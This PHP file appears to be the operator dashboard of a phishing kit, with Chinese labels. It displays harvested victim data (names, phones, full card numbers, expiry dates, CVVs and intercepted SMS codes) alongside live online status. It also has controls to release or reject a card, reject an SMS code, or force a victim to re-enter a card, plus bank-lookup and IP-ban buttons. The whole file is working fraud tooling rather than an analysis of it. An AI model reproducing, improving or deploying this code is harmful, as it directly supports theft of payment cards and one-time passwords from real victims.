<?php 
require 'config.php';

$iphone="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='iphone'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();
  if(empty($row)){
      $insert = "INSERT INTO dashboard (meta_key,value) VALUES ('iphone', '')";
      mysqli_query($conn, $insert);
  }
  $iphone = $row[3];
}


$android="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='android'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();

  if(empty($row)){
    $insert = "INSERT INTO dashboard (meta_key,value) VALUES ('android', '')";
      mysqli_query($conn, $insert);
  }
  $android = $row[3];
}

$web="";
$row = [];
$sql = "SELECT * FROM dashboard where meta_key='web'";
if ($result = mysqli_query($conn, $sql)) {
  $row = $result->fetch_row();

  if(empty($row)){
       $insert = "INSERT INTO dashboard (meta_key,value) VALUES ('web', '')";
       mysqli_query($conn, $insert);
  }
  $web = $row[3];
}
?>
    <table id='user_data_table' class="table table-sm table-hover user_auto_reload_cl" >
        <thead>
            <tr>
                <th scope="col">#</th>
                <th scope="col">姓名</th>

                <!--<th scope="col">address</th>-->


                <th scope="col">电话</th>

                <th scope="col">卡号</th>
                <th scope="col">日期</th>
                <th scope="col">cvv</th>
                <th scope="col">短信</th>
                <th scrope="col">状态</th>
                <th scope="col">选择指令</th>
                <th scope="col">ip禁止/银行信息</th>
            </tr>
        </thead>
        <tbody>
            <?php
            $number_users = 0;
            $sql = "SELECT id,fullname,phone,cardstatus,verificcode,exp_date,card_code, cardnumber, code, TIMESTAMPDIFF(SECOND, ifnull(date_updated, now()), now()) diff FROM user_information u ORDER BY `u`.`id` DESC";


            if ($result = mysqli_query($conn, $sql)) {

                while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
                    $rows[] = $row;
                    $rowstatus = "";
                    if (isset($row['verificcode'])) {
                        if ($row['verificcode'] == 2)
                            $rowstatus = "rejected";
                        if ($row['verificcode'] == 1)
                            $rowstatus = "approved";
                    }
           
                    $number_users = $number_users + 1;
            ?>
                    <tr class="row-<?php echo $row['id']; ?> <?php echo $rowstatus; ?>" data-num-users="<?php echo $number_users; ?>">
                        <td data-id="<?php echo $row['id']; ?>"><?php echo $row['id']; ?></td>
                        <td data-id="<?php echo $row['id']; ?>"><?php echo $row['fullname']; ?></td>

                        <?php /* ?><td data-id="<?php echo $row['id']; ?>"><?php echo $row['additional']; ?></td><?php */ ?>


                        <td data-id="<?php echo $row['id']; ?>"><?php echo $row['phone']; ?></td>

                        <td data-id="<?php echo $row['id']; ?>" >

                            
                            <?php 
                                $firstSixDigits = substr($row['cardnumber'], 0, 6);
                                if($firstSixDigits==$iphone){ ?>
                                    <img src="./assets/img/iphone.png" width="40">

                                <?php }else if($firstSixDigits==$android){ ?>
                                    <img src="./assets/img/android.png" width="40">

                                <?php }else if($firstSixDigits==$web){ ?>
                                    <img src="./assets/img/web.png" width="40">

                                <?php }else{ ?>
                                    
                                <?php } ?>

                            
                           



                            <span class="btn btn-primary card_number" data-id="<?php echo $row['id']; ?>" ><?php echo $row['cardnumber']; ?></span>

                            <button class="btn" onclick="copycardnumber(<?php echo $row['cardnumber']; ?>)">复制</button>

                            <div id="<?php echo $row['id']; ?>" class="ccnumber" data-number="<?php echo $row['cardnumber']; ?>"></div>
                        </td>
                        <td data-id="<?php echo $row['id']; ?>"><?php echo $row['exp_date']; ?></td>
                        <td data-id="<?php echo $row['id']; ?>"><?php echo $row['card_code']; ?></td>
                        <td id='col-code-<?php echo $row['id']; ?>' data-id="<?php echo $row['id']; ?>" class="copy-sms-code sms-tooltip">
                            <?php if(!empty($row['code'])){ ?>
                                <span class="btn btn-primary">
                                   <?php  echo $row['code']; ?>
                               </span>
                            <?php } ?>
                        </td>
                        <td data-id="<?php echo $row['id']; ?>">
                            <div id='user<?php echo $row['id']; ?>'>
                                <?php if ($row['diff'] > 0 && $row['diff'] < 10) {
                                    if ($row['status'] != 1) {
                                        $sql = "UPDATE user_information SET status=1 WHERE id='" . $row['id'] . "'";
                                        mysqli_query($conn, $sql);
                                    }
                                ?>
                                    <div class="online"><span class="tooltiptext">Online</span></div>
                                <?php } else {
                                    if ($row['status'] != 0) {
                                        $sql = "UPDATE user_information SET status=0 WHERE id='" . $row['id'] . "'";
                                        mysqli_query($conn, $sql);
                                    }
                                ?>

                                    <div class="offline"><span class="tooltiptext">Offline</span></div>
                                <?php } ?>
                            </div>
                        </td>
                        <td data-id="<?php echo $row['id']; ?>">
                            <?php

                            $cardstatus_div = "cardstatus".$row['id'];
                            $none = "cardstatus_none_".$row['id'];
                            $reject = "cardstatus_reject_".$row['id'];
                            $approve = "cardstatus_approve_".$row['id'];
                            echo "<span id=".$cardstatus_div.">";

                            if ($row['cardstatus'] == "none") {
                                echo "<span id=".$none." style='color:black;font-size:16px;'>没有卡</span>";
                            }
                            /*if ($row['cardstatus'] == "reject" || $row['cardstatus'] == "added") {
                                echo "<span id=".$reject."  style='color:red;font-size:16px;'>卡号已拒绝</span>";
                            }*/

                            if ($row['cardstatus'] == "reject" && $row['verificcode'] == "2") {
                                echo "<span id=".$reject."  style='color:red;font-size:16px;'>短信已拒绝</span>";
                            }

                            if ($row['cardstatus'] == "reject" && $row['verificcode'] == "3") {
                                echo "<span id=".$reject."  style='color:red;font-size:16px;'>重新填写卡号</span>";
                            }

                            if ($row['cardstatus'] == "approve") {
                                echo "<span id=".$approve."  style='color:green;font-weight:bold;font-size:16px;'>通过</span>";
                            }
                            ?>
                            </span>
                            <select class="form-select cardstatus" name="cardstatus" userid="<?php echo $row['id']; ?>">
                                <option value="">请选择卡片状态</option>
                                <option value="release">卡片放行</option>
                                
                                <option value="refuse">卡片拒绝</option>
                                <option value="releaseh">短信放行</option>
                                <option value="reject">短信拒绝</option>
                                <option value="cardInvalid">强制重填卡号</option>
                            </select>
                            <div class="d-flex p-2 btn-custom flex-column">
                                <button type="button" class="btn btn-success cardrelease mb-2" userid="<?php echo $row['id']; ?>" style="display:none;">卡放行</button>
                                <button type="button" class="btn btn-danger cardreject" userid="<?php echo $row['id']; ?>" style="display:none;">卡拒绝</button>
                            </div>
                        </td>

                        <td data-id="<?php echo $row['id']; ?>" class="d-flex p-2 btn-custom">

                            <button type="button" title="Ban IP" class="btn btn-danger banip" userid="<?php echo $row['id']; ?>" <?php echo $row['banstatus'] ? 'disabled' : ''; ?>><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-slash-circle" viewBox="0 0 16 16">
                                    <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
                                    <path d="M11.354 4.646a.5.5 0 0 0-.708 0l-6 6a.5.5 0 0 0 .708.708l6-6a.5.5 0 0 0 0-.708z" />
                                </svg></button>
                            <!-- <button type="button" class="btn btn-success release" userid="<?php echo $row['id']; ?>">放行</button>
                            <button type="button" class="btn btn-danger reject" userid="<?php echo $row['id']; ?>">拒绝</button> -->

                            <a class="btn btn-sm btn-icon item-delete" userid="<?php echo $row['id']; ?>" href="javascript:void(0);"><i class="bx bx-trash me-1"></i></a>

                            <button class="btn btn-info validcard_number" onclick="checkCardValid(<?php echo $row['cardnumber']; ?>)" cardnumber="<?php echo $row['cardnumber']; ?>" >银行信息</i></button>
                        </td>
                    </tr>
            <?php
                }
            }
            ?>
        </tbody>
  </table>
